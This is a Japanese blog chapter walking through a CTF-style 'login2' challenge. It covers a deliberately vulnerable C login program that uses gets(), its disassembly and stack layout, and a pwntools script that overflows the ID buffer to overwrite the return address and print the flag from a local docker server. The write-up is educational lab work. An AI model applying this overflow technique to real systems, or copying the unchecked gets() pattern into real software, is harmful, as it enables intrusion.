### 第3章：login2（スタックバッファオーバーフロー2）

#### 3.1：問題の概要

ソースコード（login2.c）と、プログラムバイナリ（login2）が提供されています。

[初回](https://daisuke20240310.hatenablog.com/entry/kaidai_1) で紹介したように、docker を起動しておき、ブラウザにアクセスします。下図のように、それぞれのリンクをクリックすることで、ダウンロードすることが出来ます（画像は 第2章のものです）。

<figure class="figure-image figure-image-fotolife" title="login1">[f:id:daisuke20240310:20250512222106p:plain:alt=login1]<figcaption>login1</figcaption></figure>

#### 実践

まずは、自力でやっていきます。

表層解析します。あ、実行権限がないので付与しておきます。また、最初から、glibc-2.31 に依存ライブラリを変更しておきます（方法、経緯などは、[システムにインストールされたものと異なるバージョンのglibcを使う方法](https://daisuke20240310.hatenablog.com/entry/glibc) を参考にしてください）。

```sh
$ chmod +x login2

$ cp ./login2 ./login2_patch

$ patchelf --set-rpath /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu --set-interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so ./login2_patch 

$ ldd login2
        linux-vdso.so.1 (0x00007ffc9c1e8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4057d72000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f4057f6e000)

$ file login2_patch
login2_patch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=0fc14a5fcbd45d2800e1e3d4db38bbc0d1ea3dd7, not stripped

$ ~/bin/checksec --file=login2_patch
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  RW-RUNPATH  75 Symbols  No       0          2            login2_patch

$ pwn checksec --file=login2_patch
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter3/login2_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
```

実行してみます。

問題サーバーにアクセスすると、flag.txt が用意されていると思いますが、ローカルで試すときには、自分で、flag.txt を準備する必要があります。

問題文（Can’t you login?）は、第2章と同じです。ログインできるようにすればいいようです。

```sh
$ ./login2_patch 
Failed to read flag.txt

$ nano flag.txt

$ cat flag.txt 
flagflag

$ ./login2_patch
ID: aaa
Password: bbb
Invalid ID or password
```

ソースコード（login2.c）を見ていきます。

setup関数は、環境準備のためのようです。main関数を見ると、ID は admin であることが分かります。Password は、flag.txt の中身自体のようです（第2章とだいたい同じ）。

ローカル変数の id と、password は、どちらもスタックバッファオーバーフローを起こせそうです。セキュリティ機構としても、特に制約は無さそうなので、リターンアドレスを書き換えて、`printf("The flag is: %s\n", flag);` にジャンプすれば、フラグを表示できそうです。

```c
//  gcc login2.c -o login2 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char flag[0x20];

char *gets(char *s);

void setup()
{
    FILE *f = NULL;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    f = fopen("flag.txt", "rt");
    if (f == NULL) {
        printf("Failed to read flag.txt\n");
        exit(0);
    }
    fscanf(f, "%s", flag);
    fclose(f);
}

int main()
{
    char id[0x20] = "";
    char password[0x20] = "";

    setup();

    printf("ID: ");
    gets(id);
    printf("Password: ");
    gets(password);

    if (strcmp(id, "admin") == 0 &&
        strcmp(password, flag) == 0) {
        printf("Login Succeeded\n");
        printf("The flag is: %s\n", flag);
    } else
        printf("Invalid ID or password\n");
}
```

GDB で起動して、スタックの状況を確認します。

```sh
$ gdb -q login2_patch
Reading symbols from login2_patch...

pwndbg> start
Temporary breakpoint 1 at 0x401290

pwndbg> disassemble
Dump of assembler code for function main:
   0x000000000040128c <+0>:     push   rbp
   0x000000000040128d <+1>:     mov    rbp,rsp
=> 0x0000000000401290 <+4>:     sub    rsp,0x40
   0x0000000000401294 <+8>:     mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040129c <+16>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004012a4 <+24>:    mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004012ac <+32>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004012b4 <+40>:    mov    QWORD PTR [rbp-0x40],0x0
   0x00000000004012bc <+48>:    mov    QWORD PTR [rbp-0x38],0x0
   0x00000000004012c4 <+56>:    mov    QWORD PTR [rbp-0x30],0x0
   0x00000000004012cc <+64>:    mov    QWORD PTR [rbp-0x28],0x0
   0x00000000004012d4 <+72>:    mov    eax,0x0
   0x00000000004012d9 <+77>:    call   0x4011b6 <setup>
   0x00000000004012de <+82>:    lea    rdi,[rip+0xd46]        # 0x40202b
   0x00000000004012e5 <+89>:    mov    eax,0x0
   0x00000000004012ea <+94>:    call   0x401060 <printf@plt>
   0x00000000004012ef <+99>:    lea    rax,[rbp-0x20]
   0x00000000004012f3 <+103>:   mov    rdi,rax
   0x00000000004012f6 <+106>:   call   0x401090 <gets@plt>
   0x00000000004012fb <+111>:   lea    rdi,[rip+0xd2e]        # 0x402030
   0x0000000000401302 <+118>:   mov    eax,0x0
   0x0000000000401307 <+123>:   call   0x401060 <printf@plt>
   0x000000000040130c <+128>:   lea    rax,[rbp-0x40]
   0x0000000000401310 <+132>:   mov    rdi,rax
   0x0000000000401313 <+135>:   call   0x401090 <gets@plt>
   0x0000000000401318 <+140>:   lea    rax,[rbp-0x20]
   0x000000000040131c <+144>:   lea    rsi,[rip+0xd18]        # 0x40203b
   0x0000000000401323 <+151>:   mov    rdi,rax
   0x0000000000401326 <+154>:   call   0x401080 <strcmp@plt>
   0x000000000040132b <+159>:   test   eax,eax
   0x000000000040132d <+161>:   jne    0x40136c <main+224>
   0x000000000040132f <+163>:   lea    rax,[rbp-0x40]
   0x0000000000401333 <+167>:   lea    rsi,[rip+0x2d86]        # 0x4040c0 <flag>
   0x000000000040133a <+174>:   mov    rdi,rax
   0x000000000040133d <+177>:   call   0x401080 <strcmp@plt>
   0x0000000000401342 <+182>:   test   eax,eax
   0x0000000000401344 <+184>:   jne    0x40136c <main+224>
   0x0000000000401346 <+186>:   lea    rdi,[rip+0xcf4]        # 0x402041
   0x000000000040134d <+193>:   call   0x401040 <puts@plt>
   0x0000000000401352 <+198>:   lea    rsi,[rip+0x2d67]        # 0x4040c0 <flag>
   0x0000000000401359 <+205>:   lea    rdi,[rip+0xcf1]        # 0x402051
   0x0000000000401360 <+212>:   mov    eax,0x0
   0x0000000000401365 <+217>:   call   0x401060 <printf@plt>
   0x000000000040136a <+222>:   jmp    0x401378 <main+236>
   0x000000000040136c <+224>:   lea    rdi,[rip+0xcef]        # 0x402062
   0x0000000000401373 <+231>:   call   0x401040 <puts@plt>
   0x0000000000401378 <+236>:   mov    eax,0x0
   0x000000000040137d <+241>:   leave
   0x000000000040137e <+242>:   ret
End of assembler dump.
```

スタックを可視化します。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp - 0x40 | 32 | password[32]（rsp） |
| rbp - 0x20 | 32 | id[32] |
| rbp |

ID を入力するときに、32byte ではなく、48byte を書き込み、末尾の 8byte を、0x401352 あたりを設定すれば良さそうです。

エクスプロイトコードを実装しました。

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './login2_patch'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

def attack( proc, **kwargs ):
    
    id       = "a" * 32 + "a" * 8
    password = "b" * 31
    result   = id.encode() + p64(0x401352)
    
    proc.sendlineafter( 'ID: ', result[:-1] )
    proc.sendlineafter( 'Password: ', password.encode() )
    
    info( proc.recvall() )

def main():
    
    adrs = "localhost"
    port = 10002
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
```

実行してみます。

無事に、フラグが表示されました。

```sh
$ python exploit_login2.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter3/login2_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[+] Starting local process './login2_patch' argv=[b'./login2_patch'] : pid 819742
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x30 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  61 61 61 61  61 61 61 61  52 13 40 00  00 00 00 0a  xaaaaxaaaaxR?@?x????x
    00000030
[DEBUG] Received 0xa bytes:
    b'Password: '
[DEBUG] Sent 0x20 bytes:
    b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n'
[+] Receiving all data: Done (45B)
[DEBUG] Received 0x2d bytes:
    b'Invalid ID or password\n'
    b'The flag is: flagflag\n'
[*] Stopped process './login2_patch' (pid 819742)
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Invalid ID or password
    The flag is: flagflag
```

サーバの方もやってみます。こちらも成功しました。

```sh
$ python exploit_login2.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter3/login2_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[+] Opening connection to localhost on port 10002: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x30 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  61 61 61 61  61 61 61 61  52 13 40 00  00 00 00 0a  xaaaaxaaaaxR?@?x????x
    00000030
[DEBUG] Received 0xa bytes:
    b'Password: '
[DEBUG] Sent 0x20 bytes:
    b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n'
[+] Receiving all data: Done (69B)
[DEBUG] Received 0x45 bytes:
    b'Invalid ID or password\n'
    b'The flag is: FLAG{IxhH3hu2QZm9zOFu}\n'
    b'Bus error\n'
[*] Closed connection to localhost port 10002
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Invalid ID or password
    The flag is: FLAG{IxhH3hu2QZm9zOFu}
    Bus error
```

<figure class="figure-image figure-image-fotolife" title="login2 Submit">[f:id:daisuke20240310:20250515220913p:plain:alt=login2 Submit]<figcaption>login2 Submit</figcaption></figure>
